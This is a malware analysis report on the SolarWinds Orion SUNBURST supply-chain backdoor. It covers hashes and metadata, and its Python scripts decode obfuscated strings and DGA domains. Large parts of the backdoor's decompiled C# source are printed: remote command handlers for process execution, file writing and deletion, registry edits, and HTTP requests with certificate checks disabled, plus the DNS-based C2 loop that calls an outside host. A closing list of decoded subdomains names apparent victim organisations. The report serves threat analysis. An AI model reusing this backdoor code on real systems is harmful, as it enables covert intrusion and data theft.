## Solarwinds Supply Chain Attack - T1195.001 Supply Chain Compromise
Adversaries gained access to numerous public and private organizations by trojanized SolarWinds Orion software applications updates **(This attack is large, bad and very concerning)**

<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - md5 02af7cec58b9a5da1c542b5a32151ba1

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/md5file.png)

<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - info

```
Name 		solarwinds-core-v2019.4.5220-hotfix5.msp
md5 		02af7cec58b9a5da1c542b5a32151ba1
sha1 		1b476f58ca366b54f34d714ffce3fd73cc30db1a
sha256 		d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600
ssdeep 		3145728:yMbnCpAK7nuv7xYiq0bC4zheqeRHuCieBVZNP7WJOQeXt+9riYBaeIBjSxTusL:yMbCp7uf3GnqfCVrNPgLrW4GoxSG
size 		204.88MB
bytes 		214831104
mime 		application/vnd.ms-msi
extension 	application/octet-stream
Entropy 	7.9988851973414095 (Minimum: 0.0, Maximum: 8.0)
```
<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - metadata

```
codepage 		0
title 			Update for SolarWinds Orion Core Services 2019.4 (Hotfix5)
subject 		Update for SolarWinds Orion Core Services 2019.4 (Hotfix5)
author 			SolarWinds Worldwide, LLC.
comments 		Update for SolarWinds Orion Core Services 2019.4 (Hotfix5)
template 		{079A74C5-95D0-446E-86F7-B8EAF0A29654}
last_saved_by 		:RTM.1;:#RTM.1
revision_number 	{8413ED57-01DD-48F7-B521-B6C5DE1A54DF}
create_time 		2020-03-24 10:56:48
last_saved_time 	2020-03-24 10:56:48
num_words 		5
creating_application 	Windows Installer XML Toolset (3.9.1208.0)
security 		4
```
<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - extracted files

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/extracted.png)

<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - extracted files md5

```
34e9e373b21e8d8f0051f8c88e10008d  BigintOverflowFix.sql
b03dcbc2ba9114b09c04ea24c9c63321  ClearOldDataFromDetailAndHourlyTables.sql
60222d9d1766ca72eb7aa2aa79b76fad  ConfigurationWizard.exe
79b811614f6e733192271ae8cee7db7e  ConfigurationWizard.exe.config
8f9360404210799ebae3731dfc5dd93d  Core_Linux_2019.4.5200.9083.apkg
a42d681ac61a4fa1d85f5812aaddd7a4  Core.Settings.json
5026956e672613583a1fa4853f792301  dbsetup_pretimeseriesorder.txt
a6a7552de53fb9011297fd8bec604d4e  Interop.NetFWTypeLib.dll
c96d6e4342ffe7bcaea1abd744f084fd  Interop.olelib.dll
39b3853848d7d01ff752c96e709dbae6  Interop.OrionSWScheduler8.dll
b93e78593460cdddefcc44d6e51c86ba  Interop.TaskScheduler.dll
c9799173b23ae28cfa58168ddc46e3fa  IS2.SolarWinds.Orion.Core.Common.dll
572f3ab5036cc50e6e245c1ef1d084d9  IS3.SolarWinds.Data.Providers.Orion.Containers.v3.dll
943d50919c7a8df571cd500e0a418a67  IS3.SolarWinds.Data.Providers.Orion.v3.dll
c9799173b23ae28cfa58168ddc46e3fa  IS3.SolarWinds.Orion.Core.Common.dll
be8fb541d3c916b4d91f59f331a62d41  ISv2.SolarWinds.Orion.Swis.PubSub.dll
be8fb541d3c916b4d91f59f331a62d41  ISv3.SolarWinds.Orion.Swis.PubSub.dll
2241d9333baa0b61b95efaf5c70144ea  NetPerfMon_WebSite.precompiled.zip
0b9c58cbcf1bb2476b149c43d071959e  NetPerfMon_WebSite.zip
b917980a6dad722a4970c7c326c6db9b  OrionCoreDatabaseScheme.dbConfig
7905e0abd29412f11bb37c02aa370cc3  OrionWeb.dll
423238911cb6be14866f815f7f234dca  Orion.xml
f4c561e087aaa20e676aca2f5dfe516a  PM_2019.4_Patch.zip
7392101b7b29b0d976db655cd6b08a18  SolarWinds.ConfigurationWizard.Plugin.Common.dll
6a2c2a4d0b3b79ffd115d7f7b6ce8a8c  SolarWinds.ConfigurationWizard.Plugin.Orion.dll
b5ab5b5a7c2e2421680f5f8b6ba86e84  SolarWinds.Database.TimeSeries.Contracts.dll
db61b8bcf5b44b790dd99f6a6c5eedd7  SolarWinds.Database.TimeSeries.dll
b12c00167341703faa428ec806ba9cc3  SolarWinds.Data.Entity.dll
b91ce2fa41029f6955bff20079468448  SolarWinds.Orion.Core.BusinessLayer.dll  <--malicious
510af37d73ab0378ec8c62c820536525  SolarWinds.Orion.Core.BusinessLayer.dll.config
73a207c34cdf8f63eb9ef5252aba7022  SolarWinds.Orion.Core.Collector.dll
c9799173b23ae28cfa58168ddc46e3fa  SolarWinds.Orion.Core.Common.dll
0943bf039fadeec49f48ea488ce0225c  SolarWinds.Orion.Core.Strings.dll
4010fef59f8aa41b476306095a6eb970  SolarWinds.Orion.Core.Strings.resources.dll.de.file
4f27bace92d5f0fd4122e90f405d736c  SolarWinds.Orion.Core.Strings.resources.dll.ja.file
be8fb541d3c916b4d91f59f331a62d41  SolarWinds.Orion.Swis.PubSub.dll
123878cf5bb61c095369bad5b72bc516  Solarwinds.Settings.dll
24c5cdcd69ed8466eda14e8ced59bdba  taskschd.dll
c1c201388736053e9a883867dd5aba79  Toolset_2019.4_Patch.zip
a56b277160c716b1454e8fa3a7322393  TruncateFirstAndLastPartitions.sql
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - info

```
Name 		solarwinds.orion.core.businesslayer.dll
md5 		b91ce2fa41029f6955bff20079468448
sha1 		76640508b1e7759e548771a5359eaed353bf1eec
sha256 		32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77
ssdeep 		12288:Zx7m/z9aEBzvnvLtYAi6uLlYQ69BBpIvF1tjpH7BKi+0A8vca9owQ:6aEBTvRBi6uL6dIvDtjpH9+0A8vca9oD
size 		987.34KB
bytes 		1011032
mime 		application/x-dosexec
extension 	application/x-msdos-program
Entropy 	5.582826996737918 (Minimum: 0.0, Maximum: 8.0)
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - signed - T1553.002 Code Signing

```
CommonName 		Solarwinds Worldwide, LLC
OrganizationalUnit 	None
Organization 		Solarwinds Worldwide, LLC
Locality 		Austin
StateOrProvinceName 	None
CountryName 		US
Start 			Jan 21 00:00:00 2020 GMT
Ends 			Jan 20 23:59:59 2023 GMT
SerialNumber 		21150566861557194870231784728595120365
SerialNumberMD5 	08e35543d6110ed11fdf558bb093d401
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - metadata

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/businesslayermeta.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - function - T1587.001 Develop Capabilities: Malware

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/function.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - variables - T1027 Obfuscated Files or Information

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/vars.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - Pyhton Decoder (base64 + zlib)

```
from base64 import b64decode
from zlib import decompress

def decode(string):
    return decompress(b64decode(string),-15)

for x in ['SywrLstNzskvTdFLzs8FAA==','SywoKK7MS9ZNLMgEAA==','Sy3VLU8tLtE1BAA=','Ky3WLU8tLtE1AgA=','Ky3WTU0sLtE1BAA=','Ky3WTU0sLtE1AgA=']:
	print(x," -> ", decode(x).decode('utf-8'))
```
```
SywrLstNzskvTdFLzs8FAA==  ->  avsvmcloud.com
SywoKK7MS9ZNLMgEAA==  ->  appsync-api
Sy3VLU8tLtE1BAA=  ->  eu-west-1
Ky3WLU8tLtE1AgA=  ->  us-west-2
Ky3WTU0sLtE1BAA=  ->  us-east-1
Ky3WTU0sLtE1AgA=  ->  us-east-2
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - c2 - TA0011 Command and Control

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/c2.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - c2 structure

```csharp
private enum JobEngine
{
	Idle,
	Exit,
	SetTime,
	CollectSystemDescription,
	UploadSystemDescription,
	RunTask,
	GetProcessByDescription,
	KillTask,
	GetFileSystemEntries,
	WriteFile,
	FileExists,
	DeleteFile,
	GetFileHash,
	ReadRegistryValue,
	SetRegistryValue,
	DeleteRegistryValue,
	GetRegistrySubKeyAndValueNames,
	Reboot,
	None
}
```
<br /><br />
Set delay for http helper - T1587.001 Virtualization/Sandbox Evasion

```csharp
public static void SetTime(string[] args, out int delay)
{
	delay = int.Parse(args[0]);
}
```
<br /><br />
Get host info - T1082 System Information Discovery & T1016 System Network Configuration Discovery

```csharp
public static void CollectSystemDescription(string info, out string result)
{
	result = null;
	int num = 0;
	string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + domainName;
	try
	{
		string str = ((SecurityIdentifier)new NTAccount(domainName, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof(SecurityIdentifier))).AccountDomainSid.ToString();
		result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + str;
	}
	catch
	{
		result += OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num);
	}
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + IPGlobalProperties.GetIPGlobalProperties().HostName;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.UserName;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + OrionImprovementBusinessLayer.GetOSVersion(true);
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.SystemDirectory;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + (int)TimeSpan.FromMilliseconds(Environment.TickCount).TotalDays;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + info + "\n";
	result += OrionImprovementBusinessLayer.GetNetworkAdapterConfiguration();
}
```
<br /><br />
Perform http request - T1071.001 Web Protocols

```csharp
public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
{
	result = null;
	string requestUriString = args[0];
	string s = args[1];
	string text = (args.Length >= 3) ? args[2] : null;
	string[] array = Encoding.UTF8.GetString(Convert.FromBase64String(s)).Split(new string[]
	{
		"\r\n",
		"\r",
		"\n"
	}, StringSplitOptions.None);
	HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
	HttpWebRequest httpWebRequest2 = httpWebRequest;
	httpWebRequest2.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpWebRequest2.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
	httpWebRequest.Proxy = proxy;
	httpWebRequest.Timeout = 120000;
	httpWebRequest.Method = array[0].Split(new char[]
	{
		' '
	})[0];
	foreach (string text2 in array)
	{
		int num = text2.IndexOf(':');
		if (num > 0)
		{
			string text3 = text2.Substring(0, num);
			string text4 = text2.Substring(num + 1).TrimStart(Array.Empty<char>());
			if (!WebHeaderCollection.IsRestricted(text3))
			{
				httpWebRequest.Headers.Add(text2);
			}
			else
			{
				ulong hash = OrionImprovementBusinessLayer.GetHash(text3.ToLower());
				if (hash <= 8873858923435176895UL)
				{
					if (hash <= 6116246686670134098UL)
					{
						if (hash != 2734787258623754862UL)
						{
							if (hash == 6116246686670134098UL)
							{
								httpWebRequest.ContentType = text4;
							}
						}
						else
						{
							httpWebRequest.Accept = text4;
						}
					}
					else if (hash != 7574774749059321801UL)
					{
						if (hash == 8873858923435176895UL)
						{
							if (OrionImprovementBusinessLayer.GetHash(text4.ToLower()) == 1475579823244607677UL)
							{
								httpWebRequest.ServicePoint.Expect100Continue = true;
							}
							else
							{
								httpWebRequest.Expect = text4;
							}
						}
					}
					else
					{
						httpWebRequest.UserAgent = text4;
					}
				}
				else if (hash <= 11266044540366291518UL)
				{
					if (hash != 9007106680104765185UL)
					{
						if (hash == 11266044540366291518UL)
						{
							ulong hash2 = OrionImprovementBusinessLayer.GetHash(text4.ToLower());
							httpWebRequest.KeepAlive = (hash2 == 13852439084267373191UL || httpWebRequest.KeepAlive);
							httpWebRequest.KeepAlive = (hash2 != 14226582801651130532UL && httpWebRequest.KeepAlive);
						}
					}
					else
					{
						httpWebRequest.Referer = text4;
					}
				}
				else if (hash != 15514036435533858158UL)
				{
					if (hash == 16066522799090129502UL)
					{
						httpWebRequest.Date = DateTime.Parse(text4);
					}
				}
				else
				{
					httpWebRequest.Date = DateTime.Parse(text4);
				}
			}
		}
	}
	result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("qzaoVag2rFXwCAkJ0K82quUCAA=="), httpWebRequest.Method, httpWebRequest.Address.PathAndQuery, httpWebRequest.ProtocolVersion.ToString());
	result = result + httpWebRequest.Headers.ToString() + "\n\n";
	if (!string.IsNullOrEmpty(text))
	{
		using (Stream requestStream = httpWebRequest.GetRequestStream())
		{
			byte[] array3 = Convert.FromBase64String(text);
			requestStream.Write(array3, 0, array3.Length);
		}
	}
	using (WebResponse response = httpWebRequest.GetResponse())
	{
		result += string.Format("{0} {1}\n", (int)((HttpWebResponse)response).StatusCode, ((HttpWebResponse)response).StatusDescription);
		result = result + response.Headers.ToString() + "\n";
		using (Stream responseStream = response.GetResponseStream())
		{
			result += new StreamReader(responseStream).ReadToEnd();
		}
	}
}
```
<br /><br />
UploadSystemDescription - Python fnv 64 hash logic
```python
def encrypt_fnv_64(string):
    hval = 14695981039346656037
    for letter in string:
        hval = hval ^ ord(letter)
        hval = (hval * 1099511628211) % (2 ** 64)
    return hval ^ 6605813339339102567
```

```
7574774749059321801  	->  user-agent
9007106680104765185  	->  referer
6116246686670134098  	->  content-type
16066522799090129502  	->  date
14226582801651130532  	->  close
2734787258623754862  	->  accept
11266044540366291518  	->  connection
8873858923435176895  	->  expect
13852439084267373191  	->  keep-alive
1475579823244607677  	->  100-continue
```

<br /><br />
Start a process -  T1569.002 Service Execution & T1543.003 Create or Modify System Process 

```csharp
public static int RunTask(string[] args, string cl, out string result)
{
	result = null;
	string fileName = Environment.ExpandEnvironmentVariables(args[0]);
	string arguments = (args.Length > 1) ? cl.Substring(OrionImprovementBusinessLayer.Job.GetArgumentIndex(cl, 1)).Trim() : null;
	using (Process process = new Process())
	{
		process.StartInfo = new ProcessStartInfo(fileName, arguments)
		{
			CreateNoWindow = false,
			UseShellExecute = false
		};
		if (process.Start())
		{
			result = process.Id.ToString();
			return 0;
		}
	}
	return 1;
}

```
<br /><br />
Get processes info - T1057 Process Discovery

```csharp
public static void GetProcessByDescription(string[] args, out string result)
{
	result = null;
	if (args.Length == 0)
	{
		foreach (Process process in Process.GetProcesses())
		{
			result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNqzlAgA="), process.Id, OrionImprovementBusinessLayer.Quote(process.ProcessName));
		}
		return;
	}
	using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPKMpPTi0uBgA=")))
	{
		foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
		{
			ManagementObject managementObject = (ManagementObject)managementBaseObject;
			string[] array = new string[]
			{
				string.Empty,
				string.Empty
			};
			ManagementObject managementObject2 = managementObject;
			string methodName = OrionImprovementBusinessLayer.ZipHelper.Unzip("c08t8S/PSy0CAA==");
			object[] array2 = array;
			object[] args2 = array2;
			Convert.ToInt32(managementObject2.InvokeMethod(methodName, args2));
			result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNtTRNTSrVag2quWsNgYKKVSb1MZUm9ZyAQA="), new object[]
			{
				managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("CyjKT04tLvZ0AQA=")],
				OrionImprovementBusinessLayer.Quote(managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("80vMTQUA")].ToString()),
				managementObject[args[0]],
				managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0gsSs0rCSjKT04tLvZ0AQA=")],
				array[1],
				array[0]
			});
		}
	}
}
```
<br /><br />
Kill a task by PID - T1489 Service Stop & T1543.003 Create or Modify System Process

```csharp
public static void KillTask(string[] args)
{
	Process.GetProcessById(int.Parse(args[0])).Kill();
}
```
<br /><br />
Get files and folders by path - T1083 File and Directory Discovery

```csharp
public static void GetFileSystemEntries(string[] args, out string result)
{
	string searchPattern = (args.Length >= 2) ? args[1] : "*";
	string path = Environment.ExpandEnvironmentVariables(args[0]);
	string[] value = (from f in Directory.GetFiles(path, searchPattern)
	select Path.GetFileName(f)).ToArray<string>();
	string[] value2 = (from f in Directory.GetDirectories(path, searchPattern)
	select Path.GetFileName(f)).ToArray<string>();
	result = string.Join("\n", value2) + "\n\n" + string.Join(" \n", value);
}
```
<br /><br />
Write to file - T1105 Ingress Tool Transfer

```csharp
public static void WriteFile(string[] args)
{
	string path = Environment.ExpandEnvironmentVariables(args[0]);
	byte[] array = Convert.FromBase64String(args[1]);
	for (int i = 0; i < 3; i++)
	{
		try
		{
			using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write))
			{
				fileStream.Write(array, 0, array.Length);
			}
			break;
		}
		catch (Exception)
		{
			if (i + 1 >= 3)
			{
				throw;
			}
		}
		OrionImprovementBusinessLayer.DelayMs(0.0, 0.0);
	}
}

```
<br /><br />
Check if file exists - T1083 File and Directory Discovery

```csharp
public static void FileExists(string[] args, out string result)
{
	string path = Environment.ExpandEnvironmentVariables(args[0]);
	result = File.Exists(path).ToString();
}

```
<br /><br />
Delete file by path - T1070.004 File Deletion

```csharp
public static void DeleteFile(string[] args)
{
	File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
}
```
<br /><br />
Get a registry value - T1012 Query Registry

```csharp
public static int ReadRegistryValue(string[] args, out string result)
{
	result = OrionImprovementBusinessLayer.RegistryHelper.GetValue(args[0], args[1], null);
	if (result != null)
	{
		return 0;
	}
	return 1;
}
```
<br /><br />
Modfiy a registry value - T1112 Modify Registry

```csharp
public static int SetRegistryValue(string[] args)
{
	RegistryValueKind valueKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), args[2]);
	string valueData = (args.Length > 3) ? Encoding.UTF8.GetString(Convert.FromBase64String(args[3])) : "";
	if (!OrionImprovementBusinessLayer.RegistryHelper.SetValue(args[0], args[1], valueData, valueKind))
	{
		return 1;
	}
	return 0;
}
```
<br /><br />
Delete a registry value - T1112 Modify Registry

```csharp
public static void DeleteRegistryValue(string[] args)
{
	OrionImprovementBusinessLayer.RegistryHelper.DeleteValue(args[0], args[1]);
}
```
<br /><br />
Get all registry keys and values - T1012 Query Registry

```csharp
public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
{
	result = OrionImprovementBusinessLayer.RegistryHelper.GetSubKeyAndValueNames(args[0]);
}
```
<br /><br />
Update - T1568.002 Domain Generation Algorithms & T1071.004 Application Layer Protocol: DNS

```csharp
private static void Update()
{
	bool flag = false;
	OrionImprovementBusinessLayer.CryptoHelper cryptoHelper = new OrionImprovementBusinessLayer.CryptoHelper(OrionImprovementBusinessLayer.userId, OrionImprovementBusinessLayer.domain4);
	OrionImprovementBusinessLayer.HttpHelper httpHelper = null;
	Thread thread = null;
	bool flag2 = true;
	OrionImprovementBusinessLayer.AddressFamilyEx addressFamilyEx = OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
	int num = 0;
	bool flag3 = true;
	OrionImprovementBusinessLayer.DnsRecords dnsRecords = new OrionImprovementBusinessLayer.DnsRecords();
	Random random = new Random();
	int a = 0;
	if (!OrionImprovementBusinessLayer.UpdateNotification())
	{
		return;
	}
	OrionImprovementBusinessLayer.svcListModified2 = false;
	int num2 = 1;
	while (num2 <= 3 && !flag)
	{
		OrionImprovementBusinessLayer.DelayMin(dnsRecords.A, dnsRecords.A);
		if (!OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
		{
			if (OrionImprovementBusinessLayer.svcListModified1)
			{
				flag3 = true;
			}
			num = (OrionImprovementBusinessLayer.svcListModified2 ? (num + 1) : 0);
			string hostName;
			if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New)
			{
				hostName = ((addressFamilyEx == OrionImprovementBusinessLayer.AddressFamilyEx.Error) ? cryptoHelper.GetCurrentString() : cryptoHelper.GetPreviousString(out flag2));
			}
			else
			{
				if (OrionImprovementBusinessLayer.status != OrionImprovementBusinessLayer.ReportStatus.Append)
				{
					break;
				}
				hostName = (flag3 ? cryptoHelper.GetNextStringEx(dnsRecords.dnssec) : cryptoHelper.GetNextString(dnsRecords.dnssec));
			}
			addressFamilyEx = OrionImprovementBusinessLayer.DnsHelper.GetAddressFamily(hostName, dnsRecords);
			switch (addressFamilyEx)
			{
			case OrionImprovementBusinessLayer.AddressFamilyEx.NetBios:
				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
				{
					flag3 = false;
					if (dnsRecords.dnssec)
					{
						a = dnsRecords.A;
						dnsRecords.A = random.Next(1, 3);
					}
				}
				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New && flag2)
				{
					OrionImprovementBusinessLayer.status = OrionImprovementBusinessLayer.ReportStatus.Append;
					OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.status);
				}
				if (!string.IsNullOrEmpty(dnsRecords.cname))
				{
					dnsRecords.A = a;
					OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
					httpHelper = new OrionImprovementBusinessLayer.HttpHelper(OrionImprovementBusinessLayer.userId, dnsRecords);
					if (!OrionImprovementBusinessLayer.svcListModified2 || num > 1)
					{
						OrionImprovementBusinessLayer.svcListModified2 = false;
						thread = new Thread(new ThreadStart(httpHelper.Initialize))
						{
							IsBackground = true
						};
						thread.Start();
					}
				}
				num2 = 0;
				break;
			case OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink:
			case OrionImprovementBusinessLayer.AddressFamilyEx.Atm:
				OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.Truncate);
				OrionImprovementBusinessLayer.ProcessTracker.SetAutomaticMode();
				flag = true;
				break;
			case OrionImprovementBusinessLayer.AddressFamilyEx.Ipx:
				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
				{
					OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.New);
				}
				flag = true;
				break;
			case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetwork:
			case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetworkV6:
			case OrionImprovementBusinessLayer.AddressFamilyEx.Unknown:
				goto IL_1F7;
			case OrionImprovementBusinessLayer.AddressFamilyEx.Error:
				dnsRecords.A = random.Next(420, 540);
				break;
			default:
				goto IL_1F7;
			}
			IL_1F9:
			num2++;
			continue;
			IL_1F7:
			flag = true;
			goto IL_1F9;
		}
		break;
	}
	OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
}
```

<br /><br />
DGA Encryption logic
```csharp
private static string Base64Encode(byte[] bytes, bool rt)
{
	string text = OrionImprovementBusinessLayer.ZipHelper.Unzip("K8gwSs1MyzfOMy0tSTfMskixNCksKkvKzTYoTswxN0sGAA==");
	string text2 = "";
	uint num = 0U;
	int i = 0;
	foreach (byte b in bytes)
	{
		num |= (uint)((uint)b << i);
		for (i += 8; i >= 5; i -= 5)
		{
			text2 += text[(int)(num & 31U)].ToString();
			num >>= 5;
		}
	}
	if (i > 0)
	{
		if (rt)
		{
			num |= (uint)((uint)new Random().Next() << i);
		}
		text2 += text[(int)(num & 31U)].ToString();
	}
	return text2;
}

```

<br /><br />
Decrypt DGA - Python script
```python
def decrypt_string(s):
	try:
		secert = list("rq3gsalt6u1iyfzop572d49bnx8cvmkewhj")
		secert_ext = "0_-."
		secert_len = len(secert)
		result = ""
		i = 0
		while i < (len(s)):
			if s[i] != '0':
				result += secert[(secert.index(s[i]) + secert_len - 4) % secert_len];
			else:
				result += secert_ext[secert.index(s[i + 1]) % 4]
				i+=1
			i+=1
		return result
	except:
		return "Error"
```

## Possible victims after decrypting dga (Tangled list with GUID)
`
22ohs7rqhntbeftysteptoe.com 239myjwq0znsqeyaerioncorp.com 23ete3wb39-ja5yus.dominos.com 23qd-x0jyoddzygyldendal.local 23wbizkji8iln7pycsa.local 23wgdmgecd5gpm8ycisco.com 2_7po.g582maktkenr 29-a.29dstxpnwad.optimizely. 2hlb2o2wp2sunwdwad.library.ucl 2hlhzfniwzley3zygncu.local 2hz83kaauell7iowits.iastate.ed 2ij33k5q32msnj5yspsd.sk.ca 2ij33k5q32msnjayspsd.sk.ca 2i.trm3ec5onayysiskiyous.edu 2jfxaladz3hawpyyah.org 2jm9jfor9git7yywad.optimizely. 2jr52s3zzkg2n9pwits.iastate.ed 2k8kqj8u295gi2sysuperior.local 2k9tsgw9wuzyg2iwcorp.stratusnet 2n8d7s8k2iin5rcyah.org 2nwqpe2olfbu_fweuropapier.inte 2t9phxp9ygqyxqywamr.corp.intel 2temenk9_8xglyysro.vestfor.dk 2tnbp5xbpniuwc7ya.edu 2tu8rsgiuxnlx2hwits.iastate.ed 2tu8rsgiuxnlx2wwits.iastate.ed 2u2ds3u-kwj5y8wamr.corp.intel 2ul59duqlgffdljyfa.lcl 2wn2nmj.ylznmka2h-xqf 33kmo2358ggbgc7.ts.iastate.ed 33kxbycyuixuiol1yorkton.cofy 33kxbycyuixuio-yorkton.cofy 33t_awk8mestrg1ah.org 33w5yxda27zldgl1us.rwbaird.com 397ea9dzgwlxsdj1rai.com 3ehjrqch9hx_wc.ts.iastate.ed 3elth58kaq0xsy_mr.corp.intel 3exwq33g-xyif31gncu.local 3hllabospf2no7b1vsp.com 3i7kbgkz3jjx22n1int.ncahs.net 3j7gi8iljdt0e31csa.local 3jlnyfqrwpbmssd1aerioncorp.com 3jretqdxblh8ojj1glu.com 3krwexktbao99cj.ts.iastate.ed 3luno_sw7xm3ky1aerioncorp.com 3mkrkyt3ye.rwtu7tke 3ntt.xls82wamy_tsillapachecasi 3sw8bh8tmsjj838.ts.iastate.ed 3tl9un2oerch8ct1nswhealth.net 3u9qwbs52zr8yoq1nswhealth.net 3uw3baexqjg9t981adcpgn.lab 3xlzhytcklmyagh1rbe.sk.ca 3znp8sro.helc9.orp.stratusnet 535hgt3xfa5cm.ucal 53gieq3phryja-jprod.hamilton. 57firwfqk8w.t3t9uml 57q5y5uwbmgpptzo5h2uw. 59ij3.gxtedftrjcorp.stratusnet 59ng_rlgnj0n3uyorkton.cofy 59pbjbqt.sonofuah.org 5ieps3rkmntuwe2jits.iastate.ed 5ijo8tog9rhlgspucys.local 5ile3joq82y2nk5uspsd.sk.ca 5j3xlxdmqfj8xa8ufa.lcl 5jdba9rd-iow5euah.org 5kptbyyu9k9p8qtjits.iastate.ed 5kptbyyu9k9p8qyjits.iastate.ed 5ksbkm89xbzh2o9ucorp.dvd.com 5nlbb5bxnigycplucow.local 5sqipqz8h8pjk-jprod.hamilton. 5sw0gza3ioua79jcorpcomp.drs.m 5tnieylee7y5l8eutv2.local 5tze8jcw8ep27kwuspsd.sk.ca 5tzplnsbrfmmo8fucow.local 5xkky3ai3u3rxk2ubok.com 5z7dijp573jtyqyuglu.com 5zg-q3i3urujm5jcorpcomp.drs.m 7280kxyri2thwu8ah.org 72pm8ab5d7xaucf3ad.optimizely. 73ksxej9hwrkh8t3amr.corp.intel 799k8rwapn_jzf8bi.corp 7bhiab87feooicn3amr.corp.intel 7bu5kzkbq9dphb28spsd.sk.ca 7bu5kzkbq9dphb58spsd.sk.ca 7eyogmlljeb2jr-its.iastate.ed 7gdoxx0nkyrtpwa.uoh8m 7hscanswdz-7o-i.midamerican. 7ibl5rjb5d0gzl3c4e-internal.c 7i_t7ru5omnbu83its.iastate.ed 7kn_c5q2zwinmp8cow.local 7kx2hwp9ajg57fa8chc.dom 7lybycllrgwfx8-bop.com.pk 7ny-s2jruktmcy8ah.org 7nzg59fngfg5rx73wfhf1.hewlett. 7p.jp0wzn_hwir3iomd3 7.rcoo37gz3pfpom3qcw8y 7sf5z8yqkorop3o3csnt.princegeor 7sf75oftmuemppg3premiersight.fa 7sihn2pictar8zc8rbe.sk.ca 7ssswelhh7akc8u3amr.corp.intel 7t7sbe9iz9pmnzg8.com 7tf9jdswdduca9b8smsnet.pl 7tfwn.rd77mpna8ecocorp.local 7twltoi2eie372-innout.corp 7ur7ek5dmm9cho38csa.local 7yk.lfte5ndyp5yrl5y 7zj2dlxook3cuuh3its.iastate.ed 7zn5az9xql8pcbc8spsd.sk.ca 7zn5az9xql8pcbq8spsd.sk.ca 829y3far5ioongr6spsd.sk.ca 82f7zaxqadrq3og6vsp.com 82.o2rz22d28qq6insead.org 83opqufju3zt3s-its.iastate.ed 89755knzlfr8jjl1prod.hamilton. 8brwasqxm8z8xxl1ad.optimizely. 8de58r.2s5zbn2motaf 8e7ywhhpi3adhxs1aac.dva.va.go 8ebtlp2sp.nozz6cow.local 8e_jcrg3olhpcj1ni.corp.natins 8eyehp3.h5z7np6weioffice.com 8gxbn39iw.9tkngl2j7x3n 8hsgxru58mmlejq6bi.corp 8nsq-j9z9sdtqy6gncu.local 8ntjuydakrp3njy1amr.corp.intel 